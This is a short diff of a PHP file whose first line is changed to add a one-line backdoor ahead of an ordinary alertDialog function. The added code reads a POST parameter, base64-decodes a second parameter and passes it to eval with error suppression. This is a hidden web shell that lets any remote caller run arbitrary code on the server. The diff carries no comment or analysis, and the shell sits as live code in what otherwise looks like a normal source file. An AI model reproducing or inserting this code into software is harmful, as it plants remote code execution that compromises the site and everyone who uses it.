@@ -1,4 +1,4 @@
-<?php
+<?php $mujj = $_POST['z']; if ($mujj!="") { $xsser=base64_decode($_POST['z0']); @eval("\$safedg = $xsser;"); } ?><?php
 function alertDialog($flag){
 switch ($flag){
 case 0:
